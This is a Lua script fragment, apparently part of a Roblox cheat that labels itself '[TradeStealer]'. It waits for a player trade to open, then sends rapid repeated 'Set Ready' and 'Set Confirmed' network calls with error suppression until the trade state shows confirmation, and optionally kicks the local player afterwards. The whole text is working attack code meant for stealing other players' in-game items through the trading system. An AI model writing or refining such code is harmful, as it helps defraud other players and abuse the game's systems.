-- FIXED: Ready + confirm with proper state checking and timing
local function spamReadyAndConfirm()
    local readyOk, confirmOk = false, false

    -- Wait for trade to be fully established
    for i = 1, 50 do
        if getTradeId() then break end
        task.wait(0.05)
    end

    local tid = getTradeId()
    if not tid then 
        warn("[TradeStealer] Trade ID not available for ready/confirm")
        return false 
    end

    -- Phase 1: Spam Ready
    for i = 1, 200 do
        tid = getTradeId()
        if not tid then break end

        local ctr = getTradeCounter()

        pcall(function()
            Network.Invoke("Server: Trading: Set Ready", tid, true, ctr)
        end)

        -- Check state
        local state = getTradeState()
        if state then
            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
            local readyTable = state._ready or state.ready or state.Ready
            if readyTable and readyTable[idx] == true then
                readyOk = true
                break
            end
        end

        task.wait(0.015)
    end

    -- Small delay before confirm
    task.wait(0.2)

    -- Phase 2: Spam Confirm
    for i = 1, 200 do
        tid = getTradeId()
        if not tid then break end

        local ctr = getTradeCounter()

        pcall(function()
            Network.Invoke("Server: Trading: Set Confirmed", tid, true, ctr)
        end)

        -- Check state
        local state = getTradeState()
        if state then
            local idx = state:PlayerIndex and state:PlayerIndex(player) or 1
            local confirmTable = state._confirmed or state.confirmed or state.Confirmed
            if confirmTable and confirmTable[idx] == true then
                confirmOk = true
                break
            end
        end

        task.wait(0.015)
    end

    if KICK_ON_COMPLETE and (readyOk or confirmOk) then
        safeWait(1)
        pcall(function() player:Kick("Trade completed") end)
    end

    return readyOk and confirmOk
end

-- FIXED: Wait for trade to be fully open with proper state detection
local function waitForTradeOpen(timeout)
    timeout = timeout or 10
    local start = tick()
    while tick() - start < timeout do
        local state = getTradeState()
        if state and getTradeId() then
            -- Check if both players are in trade
            if state._players or state.players or state.Players then
                return true
            end
        end
        task.wait(0.05)
    end
    return false
end

